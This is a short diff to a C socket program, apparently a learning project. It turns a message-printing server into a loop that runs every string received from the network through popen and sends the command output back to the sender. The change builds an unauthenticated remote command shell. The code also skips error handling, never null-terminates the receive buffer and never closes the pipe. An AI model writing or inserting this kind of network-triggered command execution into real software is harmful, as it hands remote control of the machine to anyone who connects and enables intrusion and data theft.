@@ -14,6 +14,7 @@ int main(){
     int clientSocket;
     struct sockaddr_in address;
     char buffer[BUFFER_SIZE];
+    char commandOutput[BUFFER_SIZE];
 
 
     //Initialize socket using Ipv4 and TCP, returns a negative value if fails.
@@ -68,13 +69,23 @@ int main(){
         BUFFER_SIZE - 1 is used to make room for the null terminator. Otherwise, we could see buffer overflow.
         This returns a value. If the value is greater than 0, then we have received something. This something is stored in the buffer array
         */
+
+        while(1){
         ssize_t bytesReceived = recv(clientSocket, buffer, BUFFER_SIZE - 1, 0);
 
         if(bytesReceived > 0){
 
-            printf("Message from the client: %s\n", buffer);
+            FILE *pipe = popen(buffer, "r");
+
+            //DO error checking here later
+
+            while(fgets(commandOutput, sizeof(commandOutput), pipe) != NULL){
+               send(clientSocket, commandOutput, strlen(commandOutput), 0);
+            }
+
 
         }
+    }
 
         printf("Closing Connection... Goodbye!\n");
 
